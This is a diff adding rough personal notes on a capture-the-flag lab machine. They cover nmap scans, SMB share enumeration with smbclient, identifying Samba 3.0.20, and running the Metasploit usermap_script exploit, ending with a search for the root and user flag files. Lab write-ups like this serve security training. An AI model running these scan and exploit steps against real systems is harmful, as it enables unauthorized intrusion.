@@ -71,4 +71,53 @@ nmap -A -T5 -p- -Pn 10.10.10.3
 -A takes loger, OS, etc
 nmap -A -T5 -p21,80 -Pn 10.10.10.3
 
+ver antes as portas**
+e depois versões**
+distccd v1 ((GNU) 4.2.4
 samba.py
+
+Port 21 FTP - ** versions are exploitable - buffer overflow - upload + social engineering to open file
+Port 22 SSH - hard - brute force
+Port 443
+
+red team quiet
+
+Host script results:
+|_clock-skew: mean: 2h08m30s, deviation: 2h49m45s, median: 8m28s
+| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.20-Debian)
+
+smbclient \\\\10.10.10.3\\
+smbclient \\\\10.10.10.3\\tmp
+
+we can upload but how to execute ?
+
+try:
+smbclient \\\\10.10.10.3\\opt
+smbclient \\\\10.10.10.3\\$ADMIN
+
+Host script results:
+|_clock-skew: mean: 2h08m30s, deviation: 2h49m45s, median: 8m28s
+| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.20-Debian)
+
+Goo
+
+Samba 3.0.20 Debian exploit
+exploit-db
+Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit) 
+
+systemctl postgresql enable
+msfconsole
+
+Rapid7:
+msf > use exploit/multi/samba/usermap_script
+msf exploit(usermap_script) > show targets
+    ...targets...
+msf exploit(usermap_script) > set TARGET < target-id >
+msf exploit(usermap_script) > show options
+msf exploit(usermap_script) > exploit
+
+locate root.txt
+locate user.txt
+
